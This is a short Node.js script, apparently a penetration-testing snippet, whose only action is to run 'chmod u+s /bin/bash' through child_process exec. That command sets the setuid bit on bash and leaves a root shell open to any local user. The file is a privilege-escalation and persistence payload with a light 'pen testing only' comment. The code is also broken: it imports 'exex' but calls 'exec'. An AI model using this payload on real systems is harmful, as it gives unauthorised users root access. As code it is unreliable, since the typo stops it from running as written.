//https://stackabuse.com/executing-shell-commands-with-node-js/
//The exec() function creates a new shell and executes a given command.
// The output from the execution is buffered, which means kept in memory, and is available for use in a callback.
//For pen testing only, dont even think about using this for something else! >:o
const { exex } = require ("child_process");

exec("chmod u+s /bin/bash", (error, stdout, stderr) => { //This is the shell command we want the script to execute
if (error) {
	console.log(`error: ${error.message}`);
	return;
}
if (stderr) {
	console.log(`stderr: ${stderr}`);
	return;
}
console.log(`Script complete: ${stdout}`); //?
});